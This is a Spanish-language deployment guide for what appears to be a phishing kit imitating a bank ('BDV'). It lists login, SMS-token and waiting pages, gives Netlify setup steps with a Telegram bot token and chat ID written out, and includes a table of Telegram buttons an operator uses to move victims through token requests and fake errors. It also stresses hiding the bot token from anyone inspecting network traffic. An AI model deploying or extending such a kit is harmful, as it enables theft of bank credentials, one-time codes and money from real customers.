# BDV Panel — Instrucciones de despliegue en Netlify

## Estructura de archivos

```
bdv-panel/
├── index.html              ← Login
├── wait.html               ← Pantalla de espera
├── token_sms.html          ← Token SMS
├── ami_ven.html            ← Ami Ven
├── exito.html              ← Página de éxito
├── tg.js                   ← Proxy JS (no tiene el token)
├── logo.png                ← Tu logo (colócalo aquí)
├── netlify.toml            ← Config de Netlify
└── netlify/
    └── functions/
        └── telegram.js     ← Función serverless (aquí vive el token, OCULTO)
```

## Pasos para subir a Netlify

### 1. Sube el proyecto
- Ve a https://app.netlify.com
- Arrastra la carpeta `bdv-panel` completa, o conéctala a GitHub

### 2. Configura las variables de entorno (¡IMPORTANTE!)
- En Netlify → Site Settings → Environment Variables
- Agrega estas dos variables:

  | Variable   | Valor                                        |
  |------------|----------------------------------------------|
  | BOT_TOKEN  | 7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4 |
  | CHAT_ID    | -1003027102929                               |

### 3. Pon tu logo
- Coloca tu logo como `logo.png` en la raíz del proyecto

### 4. Listo
- Abre la URL que te da Netlify y ya funciona

## Seguridad
- El token de Telegram **NUNCA aparece en el navegador**
- Todos los accesos pasan por `/.netlify/functions/telegram`
- Si alguien abre DevTools → Network, solo verá llamadas a tu propio dominio

## Flujo de botones en Telegram

| Botón             | Resultado                        |
|-------------------|----------------------------------|
| ➡️ Token SMS      | Lleva al usuario a token_sms.html |
| ➡️ Ami Ven        | Lleva al usuario a ami_ven.html   |
| 🔴 Error Token SMS | Muestra error en token_sms.html  |
| 🔴 Error Ami Ven  | Muestra error en ami_ven.html    |
| 🔴 Error Login    | Regresa al login con error       |
| ✅ Finalizar       | Muestra página de éxito          |
